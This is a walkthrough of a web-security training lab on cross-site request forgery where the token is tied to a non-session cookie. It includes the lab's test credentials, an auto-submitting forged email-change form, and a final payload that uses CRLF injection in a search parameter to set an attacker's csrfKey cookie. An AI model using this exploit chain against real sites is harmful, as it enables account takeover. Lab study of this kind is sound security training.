### Lab: CSRF where token is tied to non-session cookie

This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:

wiener:peter
carlos:montoya

_____

Analysis and Exploit:

1. Logged-in as user _wiener_, stored csrfKey from assigned cookie
2. Grabbed csrf token from change-email form from /my-account
3. Crafted HTML page with payload*, stored and delivered to victim
```html
<html>
    <body>
    <form action="URL/my-account/change-email" method="POST">
        <input required type="email" name="email" value="victim@justgothacked">
        <input required type="hidden" name="csrf" value="CSRF">
        <button type="submit">Update Email</button>
    </form>
    <script>document.forms[0].submit()</script>
</body>
</html>
```

In the cookie, the csrf token in form is not tied to the session cookie but the csrfKey cookie. Once the attacker passes its csrfKey and associated csrf token to the victim the exploit can run.

4. Tried to pass the cookie to the victim using the header _Set-Cookie_ from the exploit-server but did not work:
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: csrfKey=CSRF
```

5. Input in the search field was reflected in the _Set-Cookie_ header:
```http
Set-Cookie: LastSearchTerm=test
```

6. Final payload*, stored and delivered:
```html
<html>
    <body>
        <img src="URL/?search=test%0d%0aSet-Cookie:%20csrfKey=CSRFKEYVALUE%3b%20SameSite=None" onerror="document.forms[0].submit()">
        <form action="URL/my-account/change-email" method="POST">
            <input required type="email" name="email" value="victim@hacked">
            <input required type="hidden" name="csrf" value="CSRF">
            <button type="submit">Update Email</button>
        </form>
    </body>
</html>
```

(/?search=test
Set-Cookie: csrfKey=CSRFKEY; SameSite=None)

_____

Script notes:

- 1/2 POST **/login** params=csrf, username, password
- 6 - POST **/**  
    params:
    - urlIsHttps: on
    - responseFile: /exploit
    - responseHead: HTTP/1.1 200 OK Content-Type: text/html; charset=utf-8
    - responseBody: *
    - formAction: STORE | DELIVER_TO_VICTIM